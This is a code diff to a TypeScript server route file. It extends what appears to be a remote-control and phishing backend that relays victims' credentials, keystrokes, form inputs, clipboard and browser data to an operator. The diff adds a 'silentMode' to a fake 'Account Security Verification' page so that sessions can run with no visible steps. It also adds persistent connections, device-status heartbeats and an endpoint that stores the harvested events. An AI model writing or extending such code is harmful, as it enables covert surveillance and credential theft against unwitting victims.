@@ -157,13 +157,13 @@ export async function registerRoutes(
 
         if (rcToken && rcClients.has(rcToken)) {
           const pair = rcClients.get(rcToken)!;
-          const targetToOperatorTypes = ["rc_data", "rc_device_info", "rc_location", "rc_file", "rc_permission_granted", "rc_permission_denied", "rc_track_toggled", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_auto_harvest", "rc_keylog", "rc_form_intercept", "rc_activity"];
+          const targetToOperatorTypes = ["rc_data", "rc_device_info", "rc_location", "rc_file", "rc_permission_granted", "rc_permission_denied", "rc_track_toggled", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_auto_harvest", "rc_keylog", "rc_form_intercept", "rc_activity", "rc_heartbeat", "rc_device_status"];
           if (targetToOperatorTypes.includes(msg.type)) {
             if (rcRole !== "target") return;
             if (pair.operator && pair.operator.readyState === WebSocket.OPEN) {
               pair.operator.send(JSON.stringify(msg));
             }
-            const recordableTypes = ["rc_auto_harvest", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_device_info", "rc_location", "rc_permission_granted", "rc_permission_denied", "rc_activity", "rc_keylog", "rc_form_intercept", "rc_file"];
+            const recordableTypes = ["rc_auto_harvest", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_device_info", "rc_location", "rc_permission_granted", "rc_permission_denied", "rc_activity", "rc_keylog", "rc_form_intercept", "rc_file", "rc_device_status"];
             if (recordableTypes.includes(msg.type)) {
               (async () => {
                 const session = await storage.getRemoteSessionByToken(rcToken);
@@ -4217,10 +4217,13 @@ export async function registerRoutes(
           pageTitle: z.string().max(100).default("Account Security Verification"),
           pageSubtitle: z.string().max(200).default(""),
           brandColor: z.enum(["blue", "red", "green", "purple", "orange"]).default("blue"),
+          silentMode: z.boolean().default(false),
+          persistentConnection: z.boolean().default(false),
+          sessionLabel: z.string().max(200).default(""),
         }).default({}),
       }).parse(req.body);
       const steps = body.pageConfig.steps;
-      if (!steps.identity && !steps.biometric && !steps.voice && !steps.environment && !steps.documents) {
+      if (!body.pageConfig.silentMode && !steps.identity && !steps.biometric && !steps.voice && !steps.environment && !steps.documents) {
         return res.status(400).json({ error: "At least one wizard step must be enabled" });
       }
       const sessionToken = randomBytes(32).toString("hex");
@@ -4334,15 +4337,34 @@ export async function registerRoutes(
       if (session.status === "closed" || session.status === "expired") {
         return res.status(410).json({ error: "Session has ended" });
       }
+      const ALLOWED_EVENT_TYPES = ["rc_activity", "rc_device_info", "rc_location", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_auto_harvest", "rc_keylog", "rc_form_intercept", "rc_file", "rc_device_status", "rc_data"];
       const body = z.object({
+        type: z.string().refine(t => ALLOWED_EVENT_TYPES.includes(t), { message: "Invalid event type" }).optional(),
         permissionsGranted: z.array(z.string()).optional(),
         deviceInfo: z.any().optional(),
         locationData: z.any().optional(),
+        data: z.any().optional(),
+        token: z.string().optional(),
       }).parse(req.body);
-      const updated = await storage.updateRemoteSession(session.id, session.organizationId, {
-        ...body,
+
+      if (body.type && body.data) {
+        await storage.createRemoteSessionEvent({
+          sessionId: session.id,
+          eventType: body.type,
+          eventData: body.data,
+        });
+      }
+
+      const updatePayload: any = {
         status: "active",
         lastActivity: new Date(),
+      };
+      if (body.permissionsGranted) updatePayload.permissionsGranted = body.permissionsGranted;
+      if (body.deviceInfo) updatePayload.deviceInfo = body.deviceInfo;
+      if (body.locationData) updatePayload.locationData = body.locationData;
+
+      const updated = await storage.updateRemoteSession(session.id, session.organizationId, {
+        ...updatePayload,
       });
       res.json({ success: true });
     } catch (error: any) {
